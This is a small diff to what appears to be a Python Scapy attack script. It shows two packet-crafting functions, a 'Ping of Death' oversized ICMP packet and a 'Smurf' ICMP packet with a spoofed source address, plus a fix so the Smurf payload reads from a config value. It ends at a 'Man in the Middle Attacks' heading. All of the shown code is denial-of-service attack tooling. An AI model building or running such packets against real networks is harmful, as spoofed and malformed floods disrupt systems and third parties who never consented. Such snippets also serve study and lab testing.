@@ -64,8 +64,7 @@ def PingOfDeath(ipDestination):
     packet = IP(dst=ipDestination) / ICMP() / ("X" * 65000)
     return packet
 def Smurf(ipSource, ipDestination):
-    packet = IP(src=ipSource, dst=ipDestination) / ICMP() /
-    "config.LONG_PAYLOAD"
+    packet = IP(src=ipSource, dst=ipDestination) / ICMP() / config.LONG_PAYLOAD
     return packet
 
 # Man in the Middle Attacks
